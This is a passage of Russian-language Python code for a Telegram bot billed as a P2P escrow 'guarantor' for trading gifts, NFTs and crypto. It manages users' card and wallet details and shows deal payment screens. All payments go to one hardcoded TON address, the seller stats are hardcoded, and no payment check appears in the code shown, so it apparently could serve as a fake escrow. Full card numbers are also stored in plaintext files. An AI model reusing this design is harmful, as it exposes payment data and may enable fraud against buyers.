    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await send_or_edit_message(
        user_id,
        "₿ <b>Выберите криптовалюту</b>\n\n"
        "Выберите тип криптовалюты, которую хотите добавить:",
        crypto_menu
    )

@dp.callback_query(lambda callback: callback.data == "add_ton_wallet")
async def add_ton_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Сохраняем last_bot_message_id и устанавливаем новые данные
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {"step": "ton_wallet", "wallet_type": "ton", "last_bot_message_id": last_message_id}
    
    await send_or_edit_message(
        user_id,
        "👛 <b>Добавление TON кошелька</b>\n\n"
        "Отправьте адрес вашего TON кошелька:",
        back_button
    )

@dp.callback_query(lambda callback: callback.data == "view_wallets")
async def view_wallets(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_file_path = f"users/{user_id}.json"
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        
        wallets = user_info.get("wallets", {})
        if wallets:
            text = "📋 <b>Ваши кошельки:</b>\n\n"
            for wallet_type, wallet_data in wallets.items():
                if wallet_type == "card":
                    text += f"💳 <b>Банковская карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
                elif wallet_type == "ton":
                    text += f"👛 <b>TON кошелек:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    text += f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
            
            text += "\nВыберите действие:"
            await send_or_edit_message(user_id, text, manage_wallets_menu)
        else:
            text = "📋 <b>У вас пока нет добавленных кошельков</b>\n\nДобавьте кошелек, чтобы начать использовать бота."
            await send_or_edit_message(user_id, text, wallet_menu)
    else:
        text = "📋 <b>У вас пока нет добавленных кошельков</b>\n\nДобавьте кошелек, чтобы начать использовать бота."
        await send_or_edit_message(user_id, text, wallet_menu)

# Обработчики для криптовалют
@dp.callback_query(lambda callback: callback.data.startswith("crypto_"))
async def handle_crypto_selection(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    crypto_type = callback.data.replace("crypto_", "")
    
    crypto_names = {
        "btc": "Bitcoin (BTC)",
        "eth": "Ethereum (ETH)", 
        "ton": "TON",
        "usdt": "USDT"
    }
    
    # Сохраняем last_bot_message_id и устанавливаем новые данные
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {"step": "crypto_wallet", "wallet_type": f"crypto_{crypto_type}", "last_bot_message_id": last_message_id}
    
    await send_or_edit_message(
        user_id,
        f"₿ <b>Добавление {crypto_names.get(crypto_type, crypto_type.upper())} кошелька</b>\n\n"
        f"Отправьте адрес вашего {crypto_names.get(crypto_type, crypto_type.upper())} кошелька:",
        back_button
    )

# Обработчик удаления кошельков
@dp.callback_query(lambda callback: callback.data == "delete_wallet")
async def delete_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_file_path = f"users/{user_id}.json"
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        
        wallets = user_info.get("wallets", {})
        if wallets:
            # Создаем клавиатуру с кнопками для удаления каждого кошелька
            keyboard = []
            for wallet_type, wallet_data in wallets.items():
                if wallet_type == "card":
                    button_text = f"🗑 Удалить карту: {wallet_data['number'][:4]}****{wallet_data['number'][-4:]}"
                elif wallet_type == "ton":
                    button_text = f"🗑 Удалить TON: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    button_text = f"🗑 Удалить {crypto_name}: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                else:
                    continue
                
                keyboard.append([types.InlineKeyboardButton(text=button_text, callback_data=f"delete_{wallet_type}")])
            
            keyboard.append([types.InlineKeyboardButton(text="🔙 Назад", callback_data="view_wallets")])
            
            delete_menu = types.InlineKeyboardMarkup(inline_keyboard=keyboard)
            
            await send_or_edit_message(
                user_id,
                "🗑 <b>Выберите кошелек для удаления:</b>",
                delete_menu
            )
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>У вас нет кошельков для удаления</b>",
                wallet_menu
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>У вас нет кошельков для удаления</b>",
            wallet_menu
        )

# Обработчик подтверждения удаления кошелька
@dp.callback_query(lambda callback: callback.data.startswith("delete_"))
async def confirm_delete_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    wallet_type = callback.data.replace("delete_", "")
    user_file_path = f"users/{user_id}.json"
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        
        wallets = user_info.get("wallets", {})
        if wallet_type in wallets:
            # Удаляем кошелек
            del wallets[wallet_type]
            user_info["wallets"] = wallets
            
            with open(user_file_path, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            await send_or_edit_message(
                user_id,
                "✅ <b>Кошелек успешно удален!</b>",
                wallet_menu
            )
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Кошелек не найден</b>",
                wallet_menu
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>Ошибка при удалении кошелька</b>",
            wallet_menu
        ) 

# Обработчик выбора реквизитов для оплаты
@dp.callback_query(lambda callback: callback.data.startswith("select_wallet_"))
async def select_wallet_for_payment(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    deal_code = callback.data.replace("select_wallet_", "")
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    # Загружаем реквизиты пользователя
    user_file_path = f"users/{user_id}.json"
    if os.path.exists(user_file_path):
        try:
            with open(user_file_path, "r", encoding="utf-8") as file:
                user_info = json.load(file)
            
            wallets = user_info.get("wallets", {})
            if wallets:
                # Создаем клавиатуру с реквизитами
                keyboard = []
                for wallet_type, wallet_data in wallets.items():
                    if wallet_type == "card":
                        button_text = f"💳 Карта: {wallet_data['number'][:4]}****{wallet_data['number'][-4:]}"
                    elif wallet_type == "ton":
                        button_text = f"👛 TON: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                    elif wallet_type.startswith("crypto_"):
                        crypto_name = wallet_type.replace("crypto_", "").upper()
                        button_text = f"₿ {crypto_name}: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                    else:
                        continue
                    
                    keyboard.append([types.InlineKeyboardButton(text=button_text, callback_data=f"use_wallet_{deal_code}_{wallet_type}")])
                
                keyboard.append([types.InlineKeyboardButton(text="🔙 Назад", callback_data=f"back_to_deal_{deal_code}")])
                
                wallet_selection_menu = types.InlineKeyboardMarkup(inline_keyboard=keyboard)
                
                await send_or_edit_message(
                    user_id,
                    "💳 <b>Выберите реквизиты для оплаты:</b>\n\n"
                    "Выбранные реквизиты будут использованы для этой сделки.",
                    wallet_selection_menu
                )
            else:
                await send_or_edit_message(
                    user_id,
                    "❌ <b>У вас нет добавленных реквизитов</b>\n\n"
                    "Добавьте реквизиты в разделе 'Управление кошельками'",
                    back_button
                )
        except Exception as e:
            await send_or_edit_message(
                user_id,
                f"❌ <b>Ошибка при загрузке реквизитов:</b> {e}",
                back_button
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>У вас нет добавленных реквизитов</b>\n\n"
            "Добавьте реквизиты в разделе 'Управление кошельками'",
            back_button
        )

# Обработчик использования выбранного реквизита
@dp.callback_query(lambda callback: callback.data.startswith("use_wallet_"))
async def use_selected_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    data_parts = callback.data.split("_")
    deal_code = data_parts[2]
    wallet_type = data_parts[3]
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    # Загружаем информацию о сделке
    deal_path = f"deals/{deal_code}.json"
    if os.path.exists(deal_path):
        try:
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)
            
            # Загружаем реквизиты пользователя
            user_file_path = f"users/{user_id}.json"
            if os.path.exists(user_file_path):
                with open(user_file_path, "r", encoding="utf-8") as file:
                    user_info = json.load(file)
                
                wallets = user_info.get("wallets", {})
                if wallet_type in wallets:
                    wallet_data = wallets[wallet_type]
                    
                    # Сохраняем выбранный реквизит в сделке
                    deal_data["selected_buyer_wallet"] = {
                        "type": wallet_type,
                        "data": wallet_data
                    }
                    
                    with open(deal_path, "w", encoding="utf-8") as file:
                        json.dump(deal_data, file, ensure_ascii=False, indent=4)
                    
                    # Формируем информацию о выбранном реквизите
                    wallet_info = ""
                    if wallet_type == "card":
                        wallet_info = f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>"
                    elif wallet_type == "ton":
                        wallet_info = f"👛 <b>TON:</b> <code>{wallet_data['address']}</code>"
                    elif wallet_type.startswith("crypto_"):
                        crypto_name = wallet_type.replace("crypto_", "").upper()
                        wallet_info = f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address']}</code>"
                    
                    await send_or_edit_message(
                        user_id,
                        f"✅ <b>Реквизиты выбраны!</b>\n\n"
                        f"{wallet_info}\n\n"
                        f"Эти реквизиты будут использованы для сделки #{deal_code}",
                        back_button
                    )
                else:
                    await send_or_edit_message(
                        user_id,
                        "❌ <b>Реквизиты не найдены</b>",
                        back_button
                    )
            else:
                await send_or_edit_message(
                    user_id,
                    "❌ <b>Ошибка при загрузке реквизитов</b>",
                    back_button
                )
        except Exception as e:
            await send_or_edit_message(
                user_id,
                f"❌ <b>Ошибка при сохранении реквизитов:</b> {e}",
                back_button
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>Сделка не найдена</b>",
            back_button
        )

# Обработчик возврата к сделке
@dp.callback_query(lambda callback: callback.data.startswith("back_to_deal_"))
async def back_to_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    deal_code = callback.data.replace("back_to_deal_", "")
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    # Повторно показываем информацию о сделке
    deal_path = f"deals/{deal_code}.json"
    if os.path.exists(deal_path):
        try:
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)
            
            seller_id = deal_data["user_id"]
            amount = deal_data["amount"]
            description = deal_data["description"]
            
            # КУРСЫ
            USDT_RATE = 2.9  # 1 TON = 2.9 USDT
            PX_RATE = 53       # 1 TON = 53 PX
            
            # Рассчитываем суммы с учетом 5% комиссии
            ton_amount = round(amount * 1.05, 2)  # 5% комиссия
            usdt_amount = round(ton_amount * USDT_RATE, 2)
            px_amount = round(ton_amount * PX_RATE, 2)
            
            # Проверяем, есть ли у покупателя реквизиты
            buyer_wallets = {}
            buyer_file_path = f"users/{user_id}.json"
            if os.path.exists(buyer_file_path):
                try:
                    with open(buyer_file_path, "r", encoding="utf-8") as file:
                        buyer_info = json.load(file)
                    buyer_wallets = buyer_info.get("wallets", {})
                except Exception as e:
                    print(f"Ошибка при загрузке кошельков покупателя: {e}")
            
            message_text = (
                f"💳 <b>Информация о сделке #{deal_code}</b>\n\n"
                f"👤 <b>Вы покупатель</b> в сделке.\n"
                f"📌 Продавец: <b>{seller_id}</b>\n"
                f"• Успешные сделки: 0\n\n"
                f"• Вы покупаете: {description}\n\n"
                f"🏦 <b>Адрес для оплаты:</b>\n"
                f"<code>UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro</code>\n\n"
                f"💰 <b>Сумма к оплате:</b>\n"
                f"⬛️ {px_amount} PX (1% fee)\n"
                f"💵 {usdt_amount} USDT\n"
                f"💎 {ton_amount} TON\n\n"
                f"📝 <b>Комментарий к платежу:</b> {deal_code}\n\n"
                f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
                f"После оплаты ожидайте автоматического подтверждения"
            )
            
            tonkeeper_url = f"ton://transfer/UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro?amount={int(ton_amount * 1e9)}&text={deal_code}"
            
            # Создаем кнопки с реквизитами покупателя, если они есть
            buttons_rows = []
            buttons_rows.append([types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)])
            
            if buyer_wallets:
                buttons_rows.append([types.InlineKeyboardButton(text="💳 Выбрать реквизиты для оплаты", callback_data=f"select_wallet_{deal_code}")])
            
            buttons_rows.append([types.InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")])
            
            buttons = types.InlineKeyboardMarkup(inline_keyboard=buttons_rows)
            
            await send_or_edit_message(user_id, message_text, buttons)
        except Exception as e:
            await send_or_edit_message(
                user_id,
                f"❌ <b>Ошибка при загрузке сделки:</b> {e}",
                back_button
            )
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>Сделка не найдена</b>",
            back_button
        )

# Обработчик выхода из сделки
@dp.callback_query(lambda callback: callback.data == "exit_deal")
async def exit_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await send_or_edit_message(
        user_id,
        text=(
            f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
            "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://t.me/otcgifttg/71034/71035\n\n"
            "Выберите нужный пункт ниже:"
        ),
        reply_markup=main_menu
            )

# Обработчик выбора реквизитов при создании сделки
@dp.callback_query(lambda callback: callback.data.startswith("create_deal_wallet_"))
async def select_wallet_for_deal_creation(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    wallet_type = callback.data.replace("create_deal_wallet_", "")
    
    # Сохраняем выбранный кошелек и переходим к вводу суммы
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {
        "step": "amount", 
        "selected_wallet": wallet_type,
        "last_bot_message_id": last_message_id
    }
    
    # Загружаем информацию о выбранном кошельке
    user_file_path = f"users/{user_id}.json"
    wallet_info = ""
    
    if os.path.exists(user_file_path):
        try:
            with open(user_file_path, "r", encoding="utf-8") as file:
                user_info = json.load(file)
            
            wallets = user_info.get("wallets", {})
            if wallet_type in wallets:
                wallet_data = wallets[wallet_type]
                
                if wallet_type == "card":
                    wallet_info = f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>"
                elif wallet_type == "ton":
                    wallet_info = f"👛 <b>TON:</b> <code>{wallet_data['address']}</code>"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    wallet_info = f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address']}</code>"
        except Exception as e:
            print(f"Ошибка при загрузке информации о кошельке: {e}")
    
    await send_or_edit_message(
        user_id,
        f"💼 <b>Создание сделки</b>\n\n"
        f"Выбранные реквизиты: {wallet_info}\n\n"
        f"Введите сумму TON сделки в формате: <code>100.5</code>",
        back_button
    )

async def main():
    print("Бот запускается...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
